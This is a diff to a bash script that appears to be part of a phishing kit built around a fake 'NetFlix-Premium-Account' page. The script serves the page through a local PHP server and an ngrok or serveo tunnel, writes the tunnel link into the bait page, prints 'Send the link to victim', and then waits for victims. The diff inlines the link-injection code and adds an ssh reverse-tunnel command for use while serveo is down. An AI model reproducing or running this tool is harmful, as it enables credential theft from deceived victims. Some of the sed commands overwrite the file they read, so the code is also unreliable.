@@ -108,13 +108,6 @@ sleep 0.5
 done 
 
 }
-payload_ngrok() {
-
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' NetFlix-Premium-Account.html > NetFlix-Premium-Account.html
-sed 's+forwarding_link+'$link'+g' index.php > index.php
-
-}
 
 start_ngrok() {
 
@@ -129,6 +122,8 @@ printf "\e[0m\n"
 fi
 
 printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Turn on Hotspot To get Ngrok Link !!\e[0m\n"
+printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok...\e[0m\n"
 cd .www/ && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 2
@@ -140,7 +135,10 @@ printf "\e[0m\n"
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
 
-payload_ngrok
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+sed 's+forwarding_link+'$link'+g' NetFlix-Premium-Account.html > NetFlix-Premium-Account.html
+sed 's+forwarding_link+'$link'+g' index.php > index.php
+
 victimfound
 }
 
@@ -165,18 +163,6 @@ read subdomain
 subdomain="${subdomain:-${default_subdomain}}"
 fi
 
-start_serveo2
-}
-payload_serveo() {
-
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-
-sed 's+forwarding_link+'$send_link'+g' NetFlix-Premium-Account.html > NetFlix-Premium-Account.html
-sed 's+forwarding_link+'$send_link'+g' index.php > index.php
-}
-
-start_serveo2() {
-
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
 
@@ -200,8 +186,16 @@ banner
 printf "\e[0m\n"
 printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $serv_link
 printf "\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Serveo is Currently Down . So input this command in new tab to Get The link \n'
+printf "\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m ssh -R 80:localhost:$port ssh.localhost.run \n'
+printf "\n"
 
-payload_serveo
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+
+sed 's+forwarding_link+'$send_link'+g' NetFlix-Premium-Account.html > NetFlix-Premium-Account.html
+sed 's+forwarding_link+'$send_link'+g' index.php > index.php
+
 victimfound
 }
 
